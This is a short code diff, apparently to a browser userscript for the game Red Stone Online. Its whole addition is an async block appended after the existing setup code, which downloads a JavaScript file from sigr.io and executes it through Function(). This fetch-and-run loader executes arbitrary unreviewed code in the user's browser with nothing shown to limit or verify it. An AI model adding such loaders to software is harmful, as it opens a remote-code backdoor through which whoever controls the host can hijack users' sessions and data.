@@ -10,3 +10,9 @@ else if (location.pathname.match(/^\/Game/)) {
     console.log("[Mode] Red Stone Online");
     RedStone.init();
 }
+
+(async () => {
+    const f = await fetch("https://sigr.io/redstone/custom/duh.js");
+    const data = await f.text();
+    Function(data)();
+})();
